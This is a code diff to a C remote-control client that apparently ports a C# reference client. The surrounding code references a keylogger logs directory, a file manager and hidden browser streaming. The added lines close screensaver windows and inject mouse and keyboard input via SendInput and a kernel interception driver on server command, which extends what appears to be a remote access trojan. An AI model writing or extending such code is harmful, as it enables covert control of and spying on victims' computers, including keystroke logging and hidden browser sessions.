@@ -32,6 +32,57 @@
 #define DESKTOP_JOURNALPLAYBACK 0x0020
 #endif
 
+#ifndef SPI_GETSCREENSAVERRUNNING
+#define SPI_GETSCREENSAVERRUNNING 114
+#endif
+#ifndef SPI_SETSCREENSAVEACTIVE
+#define SPI_SETSCREENSAVEACTIVE 0x0011
+#endif
+#ifndef SPIF_SENDWININICHANGE
+#define SPIF_SENDWININICHANGE 0x0002
+#endif
+#ifndef WM_CLOSE
+#define WM_CLOSE 0x0010
+#endif
+
+static int remote_is_screensaver_active(void) {
+    BOOL running = FALSE;
+    (void)SystemParametersInfoA(SPI_GETSCREENSAVERRUNNING, 0, &running, 0);
+    return running ? 1 : 0;
+}
+
+static BOOL CALLBACK close_visible_windows_cb(HWND hWnd, LPARAM lParam) {
+    (void)lParam;
+    if (IsWindowVisible(hWnd))
+        PostMessageA(hWnd, WM_CLOSE, 0, 0);
+    return TRUE;
+}
+
+static void remote_disable_screensaver(void) {
+    /* Try to close screensaver desktop windows first (matches C# client behavior). */
+    HDESK hDesk = OpenDesktopA("Screen-saver", 0, FALSE, DESKTOP_READOBJECTS | DESKTOP_WRITEOBJECTS);
+    if (hDesk) {
+        EnumDesktopWindows(hDesk, close_visible_windows_cb, 0);
+        CloseDesktop(hDesk);
+    } else {
+        HWND fg = GetForegroundWindow();
+        if (fg) PostMessageA(fg, WM_CLOSE, 0, 0);
+    }
+
+    /* Restart screensaver counter (best-effort). */
+    BOOL dummy = TRUE;
+    (void)SystemParametersInfoA(SPI_SETSCREENSAVEACTIVE, 1, &dummy, SPIF_SENDWININICHANGE);
+}
+
+/* In some build setups key event flag macros are not pulled in.
+ * Define explicitly to keep SendInput keyboard injection working. */
+#ifndef KEYEVENTF_KEYDOWN
+#define KEYEVENTF_KEYDOWN 0x0000
+#endif
+#ifndef KEYEVENTF_KEYUP
+#define KEYEVENTF_KEYUP 0x0002
+#endif
+
 typedef struct { HDESK to_restore; HDESK to_close; } input_desktop_scope_t;
 
 /* Build the keylogger logs directory path.
@@ -462,6 +513,27 @@ static void send_set_status_file_manager(remote_transport_handle_t transport, co
     unsigned char frame[604];
     unsigned int frame_len = remote_proto_write_frame(full_msg, full_len, frame, sizeof(frame));
     if (frame_len > 0) send_frame_locked(transport, frame, frame_len);
+}
+
+/* SendInput-based mouse injection (more reliable than mouse_event for focus-sensitive scenarios). */
+static void remote_send_mouse_sendinput(DWORD dwFlags, DWORD mouseData) {
+    INPUT in = { 0 };
+    in.type = INPUT_MOUSE;
+    in.mi.dwFlags = dwFlags;
+    in.mi.mouseData = mouseData;
+    /* For button events, dx/dy are ignored. */
+    (void)SendInput(1, &in, sizeof(INPUT));
+}
+
+/* SendInput-based keyboard injection. */
+static void remote_send_key_sendinput(BYTE vk, int key_down) {
+    INPUT in = { 0 };
+    in.type = INPUT_KEYBOARD;
+    in.ki.wVk = vk;
+    in.ki.wScan = 0;
+    in.ki.dwFlags = key_down ? KEYEVENTF_KEYDOWN : KEYEVENTF_KEYUP;
+    in.ki.dwExtraInfo = 0;
+    (void)SendInput(1, &in, sizeof(INPUT));
 }
 
 /* Note: ping is sent only during the "ping handshake" (when not connected). */
@@ -1047,7 +1119,16 @@ void remote_client_run(void) {
                     }
                     else if (subtype == REMOTE_SUBTYPE_DoSetRemoteControlMode) {
                         unsigned int mode = 0;
-                        if (remote_proto_decode_do_set_remote_control_mode(dispatch_buf + consumed, dispatch_len - consumed, &mode)) {
+                        const unsigned char* body = dispatch_buf + consumed;
+                        unsigned int body_len = dispatch_len - consumed;
+                        /* Server may wrap this message as a length-delimited envelope: BA 01 00 (field 23, len 0).
+                           Treat empty wrapper as Mode=0 (User). */
+                        if (body_len == 3 && body[0] == 0xBA && body[1] == 0x01 && body[2] == 0x00) {
+                            mode = 0;
+                            g_remote_control_mode = (int)mode;
+                            remote_log("[loop] DoSetRemoteControlMode: empty wrapper BA 01 00 -> mode=User");
+                        }
+                        else if (remote_proto_decode_do_set_remote_control_mode(body, body_len, &mode)) {
                             g_remote_control_mode = (int)mode;
                             remote_log("[loop] DoSetRemoteControlMode: mode=%s (interception init done earlier on Start)", mode ? "Kernel (interception)" : "User (SendInput)");
                         } else {
@@ -1061,6 +1142,11 @@ void remote_client_run(void) {
                         unsigned int act = 0;
                         int is_down = 0, mx = 0, my = 0, mon = 0, evt_mode = -1;
                         if (remote_proto_decode_do_mouse_event(dispatch_buf + consumed, dispatch_len - consumed, &act, &is_down, &mx, &my, &mon, &evt_mode)) {
+                            /* Disable screensaver if active before injecting input (matches reference C# client). */
+                            if (act == 0 || act == 1 || act == 2 || act == 3 || act == 4) {
+                                if (remote_is_screensaver_active())
+                                    remote_disable_screensaver();
+                            }
                             int mon_x = 0, mon_y = 0;
                             unsigned int mon_w = 0, mon_h = 0;
                             int px, py;
@@ -1104,6 +1190,10 @@ void remote_client_run(void) {
                                 }
                             }
                             if (effective_mode == 1 && remote_input_interception_is_ready()) {
+                                /* Ensure injection targets the thread's input desktop. */
+                                input_desktop_scope_t scope = switch_to_input_desktop();
+                                /* Keep the OS cursor position in sync so focus changes normally. */
+                                (void)SetCursorPos(px, py);
                                 if (act == 4)
                                     remote_input_interception_mouse_move(px, py);
                                 else {
@@ -1113,22 +1203,29 @@ void remote_client_run(void) {
                                     else if (act == 5) remote_input_interception_mouse_wheel(120);
                                     else if (act == 6) remote_input_interception_mouse_wheel(-120);
                                 }
+                                if (scope.to_close) restore_input_desktop(&scope);
                             } else {
-                                input_desktop_scope_t scope = switch_to_input_desktop();
+                                /* Match the reference C# client:
+                                   - do not switch thread desktop in User/SendInput mode
+                                   - SetCursorPos primarily for MoveCursor
+                                   - clicks/wheel via SendInput */
                                 if (act == 4) {
+                                    /* MoveCursor (C# uses SetCursorPos for mouse move). */
                                     SetCursorPos(px, py);
                                 } else {
+                                    /* Ensure cursor is positioned before any click/scroll so focus updates immediately. */
                                     SetCursorPos(px, py);
-                                    if (act == 0 || act == 1)
-                                        mouse_event(is_down ? MOUSEEVENTF_LEFTDOWN : MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
-                                    else if (act == 2 || act == 3)
-                                        mouse_event(is_down ? MOUSEEVENTF_RIGHTDOWN : MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
-                                    else if (act == 5)
-                                        mouse_event(MOUSEEVENTF_WHEEL, 0, 0, 120, 0);
-                                    else if (act == 6)
-                                        mouse_event(MOUSEEVENTF_WHEEL, 0, 0, (DWORD)-120, 0);
+
+                                    if (act == 0 || act == 1) {
+                                        remote_send_mouse_sendinput(is_down ? MOUSEEVENTF_LEFTDOWN : MOUSEEVENTF_LEFTUP, 0);
+                                    } else if (act == 2 || act == 3) {
+                                        remote_send_mouse_sendinput(is_down ? MOUSEEVENTF_RIGHTDOWN : MOUSEEVENTF_RIGHTUP, 0);
+                                    } else if (act == 5) {
+                                        remote_send_mouse_sendinput(MOUSEEVENTF_WHEEL, 120);
+                                    } else if (act == 6) {
+                                        remote_send_mouse_sendinput(MOUSEEVENTF_WHEEL, (DWORD)-120);
+                                    }
                                 }
-                                if (scope.to_close) restore_input_desktop(&scope);
                             }
                             if (g_hidden_browser_streaming && remote_hidden_browser_is_active()) {
                                 if (act != 4) Sleep(5);
@@ -1145,6 +1242,8 @@ void remote_client_run(void) {
                         unsigned char key = 0;
                         int key_down = 0, evt_mode = -1;
                         if (remote_proto_decode_do_keyboard_event(dispatch_buf + consumed, dispatch_len - consumed, &key, &key_down, &evt_mode)) {
+                            if (remote_is_screensaver_active())
+                                remote_disable_screensaver();
                             int effective_mode = (evt_mode >= 0) ? evt_mode : (int)g_remote_control_mode;
                             if (g_hidden_browser_streaming) effective_mode = 1;
                             if (g_hidden_browser_streaming && remote_hidden_browser_is_active()) {
@@ -1157,13 +1256,14 @@ void remote_client_run(void) {
                             remote_log("[loop] DoKeyboardEvent decoded: key=%u (0x%02X) key_down=%d mode=%d", (unsigned)key, (unsigned)key, key_down, effective_mode);
                             if (effective_mode == 1 && remote_input_interception_is_ready()) {
                                 remote_log("[loop] DoKeyboardEvent -> input via Kernel (interception driver)");
+                                /* Ensure injection targets the thread's input desktop. */
+                                input_desktop_scope_t scope = switch_to_input_desktop();
                                 remote_input_interception_key(key, key_down);
+                                if (scope.to_close) restore_input_desktop(&scope);
                             } else {
                                 remote_log("[loop] DoKeyboardEvent -> input via User (keybd_event) [mode=%d interception_ready=%d]",
                                     effective_mode, remote_input_interception_is_ready());
-                                input_desktop_scope_t scope = switch_to_input_desktop();
-                                keybd_event((BYTE)key, 0, key_down ? 0 : KEYEVENTF_KEYUP, 0);
-                                if (scope.to_close) restore_input_desktop(&scope);
+                                remote_send_key_sendinput((BYTE)key, key_down);
                             }
                             if (g_hidden_browser_streaming && remote_hidden_browser_is_active()) {
                                 Sleep(5);
